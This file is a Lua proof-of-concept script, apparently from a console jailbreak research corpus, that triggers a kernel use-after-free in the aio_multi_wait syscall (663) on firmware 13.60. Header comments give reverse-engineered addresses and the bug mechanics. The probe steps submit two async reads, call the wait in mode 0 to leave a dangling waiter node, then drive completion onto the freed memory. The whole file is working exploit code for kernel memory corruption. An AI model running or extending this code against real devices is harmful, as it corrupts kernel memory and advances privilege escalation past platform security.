-- CRASH_CLASS: HIGH
-- PROBE 1211a: aio_multi_wait (663) with the Relapse/Bagagwa argument shape.
--
-- 13.60 static (RVA 0x3b0210): mode is uap[0x18], count is uap[8] bounded 1..0x80,
-- ids are uap[0] dwords (low16 = slot, high16 = generation < 0x80), statuses go to
-- uap[0x10], timeout pointer is uap[0x20].
--   mode 1 (0x3b0798) advances the waiter node: r14 += 0x38 per iteration.
--   mode 0 (0x3b08e5) reloads rcx = [rbx+0x40], the ARRAY BASE, every iteration and
--   links that one node onto every request, overwriting node->owner (+0x18) with the
--   current request. The cleanup loop at 0x3b0db0 unlinks by node->owner, so only the
--   LAST request is detached; requests 0..n-2 keep a pointer to a node that the tail
--   frees at 0x3b0f93. That is a deterministic use-after-free, no race.
--
-- Every earlier probe in this corpus called 663 with count = 1, which links exactly
-- one node onto one request and frees nothing dangling. This probe is the first to
-- use count = 2 with mode = 0.

print("=== PROBE 1211a: aio_multi_wait mode 0, count 2 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    if type(v) == "table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local function call(tag, fn)
    local ok, rv = pcall(fn)
    if not ok then print(string.format("  [%s] PCALL-FAIL %s", tag, tostring(rv):sub(1,60))) return nil end
    local h,l = hi_lo(rv)
    print(string.format("  [%s] ret=0x%08X_%08X err=%s", tag, h, l, ES()))
    return rv
end

local pid0 = to_num(mk(20)())
print(string.format("[0] pid=%u", pid0))

local sv = memory.alloc(8) wd(sv,0) wd(sv+4,0)
call("socketpair", function() return mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv)) end)
local fd0, fd1 = rd(sv), rd(sv+4)
print(string.format("    fds = %d, %d", fd0, fd1))
if fd0 <= 0 then print("no socketpair"); print("=== 1211a DONE ===") return end

local buf = memory.alloc(0x100)
local ba = addr_of(buf)
local reqs = memory.alloc(0x28*2)
local ids  = memory.alloc(16)
local st   = memory.alloc(16)
local out  = memory.alloc(16)
local tmo  = memory.alloc(8)
local idsA = memory.alloc(16)
local idsB = memory.alloc(16)
local tb   = memory.alloc(8)

local function zero_reqs()
    for i=0,0x28*2-1,4 do wd(reqs+i,0) end
    for i=0,1 do
        local r = reqs + i*0x28
        wd(r+0x08, 0x10)
        wd(r+0x10, ba % 4294967296) wd(r+0x14, math.floor(ba/4294967296))
        wd(r+0x20, fd0)
    end
end
local function submit2(tag)
    zero_reqs()
    wd(ids,0) wd(ids+4,0)
    call(tag, function() return mk(669)(uint64(0x1001),uint64(reqs),uint64(2),uint64(3),uint64(ids)) end)
    local a, b = rd(ids), rd(ids+4)
    print(string.format("    id0=0x%08X id1=0x%08X", a, b))
    return a, b
end
local function poll(tag, idarr, n)
    wd(st,0xEEEEEEEE) wd(st+4,0xEEEEEEEE)
    call(tag, function() return mk(664)(uint64(idarr),uint64(n),uint64(st)) end)
    local s0, s1 = rd(st), rd(st+4)
    print(string.format("    state0=0x%08X state1=0x%08X", s0, s1))
    return s0, s1
end

-- P1: control, mode 1, count 2
print("[P1] control: submit 2 pending reads, 663(mode=1, count=2, timeout=2000us)")
local a1, b1 = submit2("submitA")
wd(idsA, a1) wd(idsA+4, b1)
wd(tb, 2000)
call("wait_m1", function() return mk(663)(uint64(idsA),uint64(2),uint64(out),uint64(1),uint64(tb)) end)
print(string.format("    out0=0x%08X out1=0x%08X", rd(out), rd(out+4)))
poll("pollA", idsA, 2)

-- P2: the bug shape, mode 0, count 2
print("[P2] exploit shape: submit 2 pending reads, 663(mode=0, count=2, timeout=2000us)")
local a2, b2 = submit2("submitB")
wd(idsB, a2) wd(idsB+4, b2)
wd(tb, 2000)
call("wait_m0", function() return mk(663)(uint64(idsB),uint64(2),uint64(out),uint64(0),uint64(tb)) end)
print(string.format("    out0=0x%08X out1=0x%08X  (a 0x10000 bit means the node was already armed)",
                    rd(out), rd(out+4)))
poll("pollB", idsB, 2)

print("[P3] complete one request while its waiter node is freed")
local wb = memory.alloc(16)
for i=0,12,4 do wd(wb+i, 0x41424344) end
call("write", function() return mk(4)(uint64(fd1),uint64(wb),uint64(16),uint64(0)) end)
poll("pollC", idsB, 2)

print("[P4] drive completion with a single-id mode 1 wait on id0")
local one = memory.alloc(8) wd(one, a2)
wd(tb, 20000)
call("wait_single", function() return mk(663)(uint64(one),uint64(1),uint64(out),uint64(1),uint64(tb)) end)
print(string.format("    out=0x%08X", rd(out)))
poll("pollD", idsB, 2)

print("[P5] delete both, then alive check")
local errs = memory.alloc(16)
call("delete", function() return mk(662)(uint64(idsB),uint64(2),uint64(errs)) end)
print(string.format("    err0=0x%08X err1=0x%08X", rd(errs), rd(errs+4)))

local pid1 = to_num(mk(20)())
print(string.format("[Z] pid_end=%u (start %u)", pid1, pid0))
print("=== 1211a DONE ===")
